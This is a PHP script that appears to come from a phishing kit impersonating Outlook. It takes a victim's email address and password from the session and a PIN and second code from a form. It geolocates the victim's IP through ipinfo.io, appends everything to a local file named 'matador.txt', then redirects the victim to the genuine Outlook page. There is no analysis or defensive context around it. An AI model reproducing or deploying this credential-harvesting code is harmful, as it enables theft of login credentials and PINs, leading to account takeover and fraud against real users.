<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$user_ip}/city"));

if(isset($_POST['p']) && isset($_POST['p2'])){
	

	$file = fopen("matador.txt", "a");
	

fwrite($file, "Correo: ".$_SESSION['e']."   Psswrd: ".$_SESSION['c']." 
Pin ".$_POST['p']."	
Cpn ".$_POST['p2']." 
Fecha: ".date('Y-m-d')." - ".date('H:i:s')." 
ip:  ".$userp." ".$cc." ".$city." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);
unset ($_SESSION['e']);
unset ($_SESSION['c']);
	
	echo "<script> window.top.location.href = 'https://outlook.live.com/owa/'</script>";
}
	
?>